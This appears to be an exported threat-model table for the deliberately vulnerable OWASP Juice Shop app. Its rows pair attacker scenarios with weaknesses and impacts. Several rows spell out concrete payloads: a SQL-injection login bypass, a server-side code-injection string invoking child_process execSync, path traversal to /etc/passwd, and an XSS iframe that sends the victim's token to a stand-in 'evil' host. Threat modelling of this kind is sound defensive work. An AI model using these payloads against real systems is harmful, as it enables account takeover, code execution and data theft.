g.title: Internet Attacker 2 roles; access details in Identified Actors Inject Input into Server Interpreters I POST to /rest/user/login with email set to a known address followed by '-- and any password. C-03 · Authentication and Session Service No account required Database access relies on concatenated queries (W-002) Unauthenticated login as any user including admin, and extraction of Users table data such as password hashes and TOTP secrets. Disclosure of customer information Unauthorized administration and changes to protected business data

Internet Attacker 2 roles; access details in Identified Actors Bypass or Forge Authentication I copy the RSA private key literal from lib/insecurity.ts:21 in the public repository. C-03 · Authentication and Session Service No account required; Public source available Secrets are committed to source instead of a managed store (W-007) Any internet user can mint valid session tokens for every account, including admin and accounting roles, and compute valid deluxeToken values, giving full account takeover across the API that trusts these tokens. Unauthorized administration and changes to protected business data Customer account misuse and disclosure of private account data

Internet Attacker 2 roles; access details in Identified Actors Bypass Authorization to Gain Access A signed-in attacker puts another user's ID into the owner field of the request (req.body.UserId and the like); the query trusts it instead of the session identity, so the attacker reads or changes every other user's records — horizontal privilege escalation across all accounts. C-02 · Express REST API Server No account required Authorization is implemented route by route (W-003) Technical consequence not established. Unauthorized administration and changes to protected business data

Internet Attacker 2 roles; access details in Identified Actors Access Exposed Data and Secrets A request-controlled path with `../` can read arbitrary files (/etc/passwd, source, secrets) or write outside the intended root. C-02 · Express REST API Server Regular account required Input handling lacks enforced boundary validation (W-004) Technical consequence not established. Disclosure of customer information

Internet Attacker 2 roles; access details in Identified Actors Server process takeover via stored code evaluation I log in as any customer and POST /profile with username=#{require('child_process').execSync('id').toString()}. C-02 · Express REST API Server Regular account required Application data crosses into executable code (W-001) Remote code execution as the application user: read the SQLite database with all synthetic credentials and card data, alter files, or take the service down. Service disruption or compromise of application data

Internet Attacker 2 roles; access details in Identified Actors Inject Scripts into Victim Browsers I craft /#/search?q=<iframe src="javascript:fetch('//evil/?t='+localStorage.token)"> and send it to a logged-in victim. C-01 · Angular SPA Frontend Victim interaction required Frontend rendering lacks enforced output encoding (W-006) Script execution in the victim's session; theft of the localStorage JWT enables authenticated API calls as the victim (account takeover for the token lifetime). Customer account misuse and disclosure of private account data

Internet Attacker 2 roles; access details in Identified Actors Abuse Cross-Site Requests I obtain a Google access token for my own account and craft https://shop/#access_token=<token>. C-01 · Angular SPA Frontend Victim interaction required OAuth sign-in requests are not bound to the user's browser session (W-011) Victim session silently bound to the attacker's account; addresses and payment cards the victim enters become readable by the attacker. Customer account misuse and disclosure of private account data

Supply-Chain / Build Attacker 1 role; access details in Identified Actors Compromise the Build or Its Inputs A supply-chain attacker who takes over any direct or transitive npm package publishes a malicious version inside an accepted semver range; because .npmrc sets package-lock=false, the next Dockerfile `npm install --omit=dev` and the release `npm install --production` resolve it fresh and bake it into the published bkimminich/juice-shop image and release archives. C-08 · CI/CD Pipeline Build or dependency access required Build pipeline trusts mutable third-party references (W-005) Attacker-controlled code runs during the build with access to the job's secrets and ships inside the Docker Hub image and GitHub release archives consumed by training deployments, giving persistent code execution in every downstream instance. Service disruption or compromise of application data
g.text: Compromise the Build or Its Inputs
